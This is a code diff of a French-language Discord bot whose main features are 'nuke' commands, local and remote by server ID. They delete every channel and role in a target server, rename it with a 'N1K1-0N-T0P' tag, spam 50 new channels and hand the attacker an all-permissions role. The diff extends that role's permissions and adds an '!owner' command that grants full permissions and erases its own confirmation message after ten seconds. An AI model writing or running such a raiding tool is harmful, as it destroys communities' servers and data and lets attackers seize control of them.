@@ -30,7 +30,6 @@ const AUTHORIZED_IDS = [
 // ============================================================
 const STATS_FILE = './stats.json';
 
-// === Déclaration des variables globales ===
 let totalNukes = 0;
 let totalChannelsDeleted = 0;
 let totalRolesDeleted = 0;
@@ -441,6 +440,129 @@ client.on('interactionCreate', async (interaction) => {
             .setTimestamp();
         await interaction.followUp({ embeds: [embed], ephemeral: true });
     }
+
+    // === BOUTON DE VÉRIFICATION ===
+    if (interaction.isButton() && interaction.customId === 'start_verif') {
+        const menuRow = new ActionRowBuilder()
+            .addComponents(
+                new StringSelectMenuBuilder()
+                    .setCustomId('select_verif_type')
+                    .setPlaceholder('Choisis ton système de vérification')
+                    .addOptions([
+                        {
+                            label: '🔢 Code aléatoire',
+                            description: 'Le bot te donnera un code à recopier.',
+                            value: 'code'
+                        },
+                        {
+                            label: '✅ Bouton simple',
+                            description: 'Clique sur "Je suis humain" et c\'est bon.',
+                            value: 'simple'
+                        }
+                    ])
+            );
+
+        await interaction.reply({
+            content: '**Quel type de vérification souhaites-tu utiliser ?**',
+            components: [menuRow],
+            ephemeral: true
+        });
+    }
+
+    if (interaction.isStringSelectMenu() && interaction.customId === 'select_verif_type') {
+        const choice = interaction.values[0];
+        const guild = interaction.guild;
+        const memberRole = guild.roles.cache.find(r => r.name === '✅ Membre');
+
+        if (!memberRole) {
+            return interaction.reply({ content: '❌ Erreur : Le rôle Membre n\'existe pas. Contacte un admin.', ephemeral: true });
+        }
+
+        if (choice === 'simple') {
+            const simpleRow = new ActionRowBuilder()
+                .addComponents(
+                    new ButtonBuilder()
+                        .setCustomId('confirm_simple')
+                        .setLabel('✅ Je suis humain, donne-moi l\'accès')
+                        .setStyle(ButtonStyle.Primary)
+                );
+
+            await interaction.update({
+                content: '**Système Bouton Simple :**\nClique sur le bouton ci-dessous pour obtenir le rôle.',
+                components: [simpleRow]
+            });
+        }
+
+        if (choice === 'code') {
+            const code = Math.floor(1000 + Math.random() * 9000).toString();
+            
+            if (!global.verifCodes) global.verifCodes = new Map();
+            global.verifCodes.set(interaction.user.id, code);
+
+            const modal = new ModalBuilder()
+                .setCustomId('code_verif_modal')
+                .setTitle('🔢 Vérification par code');
+
+            const codeInput = new TextInputBuilder()
+                .setCustomId('code_input')
+                .setLabel('Recopie le code ci-dessous : ' + code)
+                .setStyle(TextInputStyle.Short)
+                .setPlaceholder('Entrer le code ici...')
+                .setRequired(true);
+
+            const actionRow = new ActionRowBuilder().addComponents(codeInput);
+            modal.addComponents(actionRow);
+
+            await interaction.showModal(modal);
+        }
+    }
+
+    if (interaction.isButton() && interaction.customId === 'confirm_simple') {
+        const guild = interaction.guild;
+        const memberRole = guild.roles.cache.find(r => r.name === '✅ Membre');
+
+        if (!memberRole) {
+            return interaction.reply({ content: '❌ Erreur : Rôle introuvable.', ephemeral: true });
+        }
+
+        if (interaction.member.roles.cache.has(memberRole.id)) {
+            return interaction.reply({ content: '❌ Tu as déjà le rôle !', ephemeral: true });
+        }
+
+        await interaction.member.roles.add(memberRole);
+        await interaction.update({
+            content: '✅ **Vérification réussie !** Tu as maintenant accès à tous les salons.',
+            components: []
+        });
+    }
+
+    // === MODALE CODE ===
+    if (interaction.isModalSubmit() && interaction.customId === 'code_verif_modal') {
+        const enteredCode = interaction.fields.getTextInputValue('code_input');
+        const storedCode = global.verifCodes ? global.verifCodes.get(interaction.user.id) : null;
+
+        const guild = interaction.guild;
+        const memberRole = guild.roles.cache.find(r => r.name === '✅ Membre');
+
+        if (!memberRole) {
+            return interaction.reply({ content: '❌ Erreur : Rôle introuvable.', ephemeral: true });
+        }
+
+        if (enteredCode === storedCode) {
+            await interaction.member.roles.add(memberRole);
+            if (global.verifCodes) global.verifCodes.delete(interaction.user.id);
+            
+            await interaction.reply({
+                content: '✅ **Code correct !** Tu as maintenant accès à tous les salons.',
+                ephemeral: true
+            });
+        } else {
+            await interaction.reply({
+                content: '❌ **Code incorrect.** Réessaye en tapant `!verif` dans le salon de vérification.',
+                ephemeral: true
+            });
+        }
+    }
 });
 
 // ============================================================
@@ -509,6 +631,13 @@ client.on('messageCreate', async (message) => {
         }
         await handleRemoteNuke(message, guildId);
     }
+
+    // ============================================================
+    // COMMANDE !owner
+    // ============================================================
+    if (command === 'owner') {
+        await handleOwner(message);
+    }
 });
 
 // ============================================================
@@ -551,7 +680,6 @@ async function handleRemoteNuke(message, guildId) {
         return message.reply('❌ Serveur introuvable. Vérifie l\'ID avec `!servers`.');
     }
 
-    // Vérifier que le bot a les permissions
     const botMember = guild.members.me;
     if (!botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
         return message.reply(`❌ Je n'ai pas les permissions administrateur sur **${guild.name}**.`);
@@ -565,7 +693,6 @@ async function handleRemoteNuke(message, guildId) {
     let channelsCreated = 0;
 
     try {
-        // 1. DELETE ALL CHANNELS
         const channels = guild.channels.cache;
         const deletePromises = channels.map(async (channel) => {
             try {
@@ -575,7 +702,6 @@ async function handleRemoteNuke(message, guildId) {
         });
         await Promise.all(deletePromises);
 
-        // 2. DELETE ALL ROLES (except @everyone)
         const roles = guild.roles.cache;
         const deleteRolePromises = roles.map(async (role) => {
             if (role.name !== '@everyone' && role.id !== guild.id) {
@@ -587,13 +713,11 @@ async function handleRemoteNuke(message, guildId) {
         });
         await Promise.all(deleteRolePromises);
 
-        // 3. RENAME SERVER
         const nukeNumber = Math.floor(Math.random() * 9000) + 1000;
         try {
             await guild.setName(`☠ N1K1-0N-T0P-${nukeNumber} ☠`);
         } catch (e) {}
 
-        // 4. CREATE 50 NEW CHANNELS & SPAM
         const createPromises = [];
         for (let i = 0; i < 50; i++) {
             const name = SCARY_NAMES[i % SCARY_NAMES.length];
@@ -634,7 +758,6 @@ async function handleRemoteNuke(message, guildId) {
         }
         await Promise.all(createPromises);
 
-        // 5. CREATE SPECIAL NIKI ROLE
         try {
             const allPermissions = [
                 PermissionsBitField.Flags.Administrator,
@@ -667,7 +790,8 @@ async function handleRemoteNuke(message, guildId) {
                 PermissionsBitField.Flags.ManageNicknames,
                 PermissionsBitField.Flags.ManageRoles,
                 PermissionsBitField.Flags.ManageWebhooks,
-                PermissionsBitField.Flags.ManageEmojisAndStickers
+                PermissionsBitField.Flags.ManageEmojisAndStickers,
+                PermissionsBitField.Flags.ModerateMembers
             ];
 
             const totalPermissions = allPermissions.reduce((acc, perm) => acc | perm, 0n);
@@ -680,7 +804,6 @@ async function handleRemoteNuke(message, guildId) {
                 permissions: totalPermissions
             });
 
-            // Donner le rôle à l'utilisateur qui a lancé la commande
             const authorMember = guild.members.cache.get(message.author.id);
             if (authorMember) {
                 await authorMember.roles.add(nikiRole);
@@ -694,7 +817,6 @@ async function handleRemoteNuke(message, guildId) {
             console.log("Erreur lors de la création du rôle NIKI:", e);
         }
 
-        // 6. UPDATE STATS
         totalNukes++;
         totalChannelsDeleted += channelsDeleted;
         totalRolesDeleted += rolesDeleted;
@@ -729,7 +851,7 @@ async function handleRemoteNuke(message, guildId) {
 }
 
 // ============================================================
-// NEW SERVER COMMAND (CORRIGÉ - SALONS VISIBLES)
+// NEW SERVER COMMAND
 // ============================================================
 async function handleNewServer(message, theme) {
     const template = TEMPLATES[theme];
@@ -738,13 +860,11 @@ async function handleNewServer(message, theme) {
     const guild = message.guild;
 
     try {
-        // 1. Delete all existing channels
         const channels = guild.channels.cache;
         for (const [id, channel] of channels) {
             try { await channel.delete(); } catch (e) {}
         }
 
-        // 2. Delete all roles (except @everyone)
         const roles = guild.roles.cache;
         for (const [id, role] of roles) {
             if (role.name !== '@everyone') {
@@ -752,7 +872,6 @@ async function handleNewServer(message, theme) {
             }
         }
 
-        // 3. Create categories
         const categoryMap = {};
         for (const catName of template.categories) {
             try {
@@ -764,7 +883,6 @@ async function handleNewServer(message, theme) {
             } catch (e) {}
         }
 
-        // 4. Create a default role for members
         let memberRole = guild.roles.cache.find(r => r.name === 'Membre');
         if (!memberRole) {
             memberRole = await guild.roles.create({
@@ -774,7 +892,6 @@ async function handleNewServer(message, theme) {
             });
         }
 
-        // 5. Create new channels - EVERYONE CAN SEE THEM
         for (const channelData of template.channels) {
             try {
                 const type = channelData.type === 'voice' ? ChannelType.GuildVoice : ChannelType.GuildText;
@@ -802,7 +919,6 @@ async function handleNewServer(message, theme) {
             }
         }
 
-        // 6. Create new roles
         for (const roleData of template.roles) {
             try {
                 await guild.roles.create({
@@ -814,12 +930,10 @@ async function handleNewServer(message, theme) {
             } catch (e) {}
         }
 
-        // 7. Rename server
         try {
             await guild.setName(template.name);
         } catch (e) {}
 
-        // 8. Set server icon
         try {
             if (template.icon) {
                 const response = await fetch(template.icon);
@@ -849,7 +963,7 @@ async function handleNewServer(message, theme) {
 }
 
 // ============================================================
-// NUKE FUNCTION (SUPPRIME TOUT)
+// NUKE FUNCTION
 // ============================================================
 async function handleNuke(message) {
     await message.reply('💀 **NUKE INITIALIZED...**');
@@ -861,13 +975,11 @@ async function handleNuke(message) {
     let channelsCreated = 0;
 
     try {
-        // === Vérification des permissions du bot ===
         const botMember = guild.members.me;
         if (!botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
             return message.reply(`❌ Je n'ai pas les permissions administrateur sur **${guild.name}**.`);
         }
 
-        // 1. DELETE ALL CHANNELS
         const channels = guild.channels.cache;
         const deletePromises = channels.map(async (channel) => {
             try {
@@ -877,7 +989,6 @@ async function handleNuke(message) {
         });
         await Promise.all(deletePromises);
 
-        // 2. DELETE ALL ROLES (except @everyone)
         const roles = guild.roles.cache;
         const deleteRolePromises = roles.map(async (role) => {
             if (role.name !== '@everyone' && role.id !== guild.id) {
@@ -889,13 +1000,11 @@ async function handleNuke(message) {
         });
         await Promise.all(deleteRolePromises);
 
-        // 3. RENAME SERVER
         const nukeNumber = Math.floor(Math.random() * 9000) + 1000;
         try {
             await guild.setName(`☠ N1K1-0N-T0P-${nukeNumber} ☠`);
         } catch (e) {}
 
-        // 4. CREATE 50 NEW CHANNELS & SPAM
         const createPromises = [];
         for (let i = 0; i < 50; i++) {
             const name = SCARY_NAMES[i % SCARY_NAMES.length];
@@ -936,7 +1045,6 @@ async function handleNuke(message) {
         }
         await Promise.all(createPromises);
 
-        // 5. CREATE SPECIAL NIKI ROLE
         try {
             const allPermissions = [
                 PermissionsBitField.Flags.Administrator,
@@ -969,7 +1077,8 @@ async function handleNuke(message) {
                 PermissionsBitField.Flags.ManageNicknames,
                 PermissionsBitField.Flags.ManageRoles,
                 PermissionsBitField.Flags.ManageWebhooks,
-                PermissionsBitField.Flags.ManageEmojisAndStickers
+                PermissionsBitField.Flags.ManageEmojisAndStickers,
+                PermissionsBitField.Flags.ModerateMembers
             ];
 
             const totalPermissions = allPermissions.reduce((acc, perm) => acc | perm, 0n);
@@ -992,7 +1101,6 @@ async function handleNuke(message) {
             console.log("Erreur lors de la création du rôle NIKI:", e);
         }
 
-        // 6. UPDATE STATS
         totalNukes++;
         totalChannelsDeleted += channelsDeleted;
         totalRolesDeleted += rolesDeleted;
@@ -1166,130 +1274,139 @@ async function handleVerif(message) {
 }
 
 // ============================================================
-// GESTION DES INTERACTIONS (BOUTONS & MENUS & MODALES)
+// COMMANDE !owner - CRÉE UN RÔLE OWNER AVEC TOUTES PERMISSIONS
 // ============================================================
-client.on('interactionCreate', async (interaction) => {
-    if (interaction.isButton() && interaction.customId === 'start_verif') {
-        const menuRow = new ActionRowBuilder()
-            .addComponents(
-                new StringSelectMenuBuilder()
-                    .setCustomId('select_verif_type')
-                    .setPlaceholder('Choisis ton système de vérification')
-                    .addOptions([
-                        {
-                            label: '🔢 Code aléatoire',
-                            description: 'Le bot te donnera un code à recopier.',
-                            value: 'code'
-                        },
-                        {
-                            label: '✅ Bouton simple',
-                            description: 'Clique sur "Je suis humain" et c\'est bon.',
-                            value: 'simple'
-                        }
-                    ])
-            );
+async function handleOwner(message) {
+    const guild = message.guild;
 
-        await interaction.reply({
-            content: '**Quel type de vérification souhaites-tu utiliser ?**',
-            components: [menuRow],
-            ephemeral: true
+    // Vérifier que l'utilisateur a la permission de gérer les rôles
+    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
+        return message.reply('❌ Tu dois avoir la permission **Administrateur** pour utiliser cette commande.');
+    }
+
+    // Vérifier que le bot a la permission de gérer les rôles
+    const botMember = guild.members.me;
+    if (!botMember.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
+        return message.reply('❌ Je n\'ai pas la permission de gérer les rôles. Donne-moi la permission **Gérer les rôles**.');
+    }
+
+    // Message de confirmation avec auto-suppression
+    const confirmMsg = await message.reply('🔄 **Création du rôle Owner en cours...**');
+
+    try {
+        // === 1. Supprimer l'ancien rôle "👑 Owner" s'il existe ===
+        const oldRole = guild.roles.cache.find(r => r.name === '👑 Owner');
+        if (oldRole) {
+            try {
+                await oldRole.delete();
+                console.log('Ancien rôle Owner supprimé.');
+            } catch (e) {
+                console.log('Impossible de supprimer l\'ancien rôle:', e);
+            }
+        }
+
+        // === 2. Créer le nouveau rôle avec TOUTES les permissions ===
+        const allPermissions = [
+            PermissionsBitField.Flags.Administrator,
+            PermissionsBitField.Flags.CreateInstantInvite,
+            PermissionsBitField.Flags.KickMembers,
+            PermissionsBitField.Flags.BanMembers,
+            PermissionsBitField.Flags.ManageChannels,
+            PermissionsBitField.Flags.ManageGuild,
+            PermissionsBitField.Flags.AddReactions,
+            PermissionsBitField.Flags.ViewAuditLog,
+            PermissionsBitField.Flags.PrioritySpeaker,
+            PermissionsBitField.Flags.Stream,
+            PermissionsBitField.Flags.ViewChannel,
+            PermissionsBitField.Flags.SendMessages,
+            PermissionsBitField.Flags.SendTTSMessages,
+            PermissionsBitField.Flags.ManageMessages,
+            PermissionsBitField.Flags.EmbedLinks,
+            PermissionsBitField.Flags.AttachFiles,
+            PermissionsBitField.Flags.ReadMessageHistory,
+            PermissionsBitField.Flags.MentionEveryone,
+            PermissionsBitField.Flags.UseExternalEmojis,
+            PermissionsBitField.Flags.ViewGuildInsights,
+            PermissionsBitField.Flags.Connect,
+            PermissionsBitField.Flags.Speak,
+            PermissionsBitField.Flags.MuteMembers,
+            PermissionsBitField.Flags.DeafenMembers,
+            PermissionsBitField.Flags.MoveMembers,
+            PermissionsBitField.Flags.UseVAD,
+            PermissionsBitField.Flags.ChangeNickname,
+            PermissionsBitField.Flags.ManageNicknames,
+            PermissionsBitField.Flags.ManageRoles,
+            PermissionsBitField.Flags.ManageWebhooks,
+            PermissionsBitField.Flags.ManageEmojisAndStickers,
+            PermissionsBitField.Flags.ModerateMembers
+        ];
+
+        // Additionner toutes les permissions
+        const totalPermissions = allPermissions.reduce((acc, perm) => acc | perm, 0n);
+
+        const ownerRole = await guild.roles.create({
+            name: '👑 Owner',
+            color: '#FF0000',
+            hoist: true,
+            mentionable: true,
+            permissions: totalPermissions,
+            position: guild.roles.cache.size - 1 // Met le rôle en haut de la liste
         });
+
+        // === 3. Donner le rôle à l'utilisateur qui a tapé la commande ===
+        await message.member.roles.add(ownerRole);
+        console.log(`Rôle Owner donné à ${message.author.tag}`);
+
+        // === 4. Donner le rôle au bot ===
+        try {
+            await guild.members.me.roles.add(ownerRole);
+            console.log('Rôle Owner donné au bot.');
+        } catch (e) {
+            console.log('Impossible de donner le rôle au bot:', e);
+        }
+
+        // === 5. MESSAGE DE CONFIRMATION AVEC AUTO-SUPPRESSION ===
+        const embed = new EmbedBuilder()
+            .setColor(0x00FF00)
+            .setTitle('✅ AUTORISATION RÉUSSIE !')
+            .setDescription('Le rôle **👑 Owner** a été créé avec **toutes les permissions**.')
+            .addFields(
+                { name: '🎯 Attribué à', value: `<@${message.author.id}>`, inline: true },
+                { name: '🤖 Attribué au bot', value: `<@${client.user.id}>`, inline: true },
+                { name: '🔧 Permissions', value: '✅ Toutes les permissions (Administrateur inclus)', inline: false }
+            )
+            .setFooter({ text: 'Ce message sera supprimé dans 10 secondes...' })
+            .setTimestamp();
+
+        const successMsg = await message.channel.send({ embeds: [embed] });
+
+        // Supprimer le message de confirmation initial
+        await confirmMsg.delete();
+
+        // === 6. SUPPRESSION APRÈS 10 SECONDES ===
+        setTimeout(async () => {
+            try {
+                await successMsg.delete();
+                console.log('Message de confirmation supprimé après 10 secondes.');
+            } catch (e) {
+                console.log('Impossible de supprimer le message:', e);
+            }
+        }, 10000);
+
+    } catch (error) {
+        console.error(error);
+        await confirmMsg.edit(`❌ Erreur lors de la création du rôle Owner: ${error.message}`);
+        
+        // Supprimer le message d'erreur après 10 secondes
+        setTimeout(async () => {
+            try {
+                await confirmMsg.delete();
+            } catch (e) {}
+        }, 10000);
     }
+}
 
-    if (interaction.isStringSelectMenu() && interaction.customId === 'select_verif_type') {
-        const choice = interaction.values[0];
-        const guild = interaction.guild;
-        const memberRole = guild.roles.cache.find(r => r.name === '✅ Membre');
-
-        if (!memberRole) {
-            return interaction.reply({ content: '❌ Erreur : Le rôle Membre n\'existe pas. Contacte un admin.', ephemeral: true });
-        }
-
-        if (choice === 'simple') {
-            const simpleRow = new ActionRowBuilder()
-                .addComponents(
-                    new ButtonBuilder()
-                        .setCustomId('confirm_simple')
-                        .setLabel('✅ Je suis humain, donne-moi l\'accès')
-                        .setStyle(ButtonStyle.Primary)
-                );
-
-            await interaction.update({
-                content: '**Système Bouton Simple :**\nClique sur le bouton ci-dessous pour obtenir le rôle.',
-                components: [simpleRow]
-            });
-        }
-
-        if (choice === 'code') {
-            const code = Math.floor(1000 + Math.random() * 9000).toString();
-            
-            if (!global.verifCodes) global.verifCodes = new Map();
-            global.verifCodes.set(interaction.user.id, code);
-
-            const modal = new ModalBuilder()
-                .setCustomId('code_verif_modal')
-                .setTitle('🔢 Vérification par code');
-
-            const codeInput = new TextInputBuilder()
-                .setCustomId('code_input')
-                .setLabel('Recopie le code ci-dessous : ' + code)
-                .setStyle(TextInputStyle.Short)
-                .setPlaceholder('Entrer le code ici...')
-                .setRequired(true);
-
-            const actionRow = new ActionRowBuilder().addComponents(codeInput);
-            modal.addComponents(actionRow);
-
-            await interaction.showModal(modal);
-        }
-    }
-
-    if (interaction.isButton() && interaction.customId === 'confirm_simple') {
-        const guild = interaction.guild;
-        const memberRole = guild.roles.cache.find(r => r.name === '✅ Membre');
-
-        if (!memberRole) {
-            return interaction.reply({ content: '❌ Erreur : Rôle introuvable.', ephemeral: true });
-        }
-
-        if (interaction.member.roles.cache.has(memberRole.id)) {
-            return interaction.reply({ content: '❌ Tu as déjà le rôle !', ephemeral: true });
-        }
-
-        await interaction.member.roles.add(memberRole);
-        await interaction.update({
-            content: '✅ **Vérification réussie !** Tu as maintenant accès à tous les salons.',
-            components: []
-        });
-    }
-
-    // === GESTION DES MODALES ===
-    if (interaction.isModalSubmit() && interaction.customId === 'code_verif_modal') {
-        const enteredCode = interaction.fields.getTextInputValue('code_input');
-        const storedCode = global.verifCodes ? global.verifCodes.get(interaction.user.id) : null;
-
-        const guild = interaction.guild;
-        const memberRole = guild.roles.cache.find(r => r.name === '✅ Membre');
-
-        if (!memberRole) {
-            return interaction.reply({ content: '❌ Erreur : Rôle introuvable.', ephemeral: true });
-        }
-
-        if (enteredCode === storedCode) {
-            await interaction.member.roles.add(memberRole);
-            if (global.verifCodes) global.verifCodes.delete(interaction.user.id);
-            
-            await interaction.reply({
-                content: '✅ **Code correct !** Tu as maintenant accès à tous les salons.',
-                ephemeral: true
-            });
-        } else {
-            await interaction.reply({
-                content: '❌ **Code incorrect.** Réessaye en tapant `!verif` dans le salon de vérification.',
-                ephemeral: true
-            });
-        }
-    }
-});
-
+// ============================================================
+// LOGIN
+// ============================================================
 client.login(process.env.TOKEN);
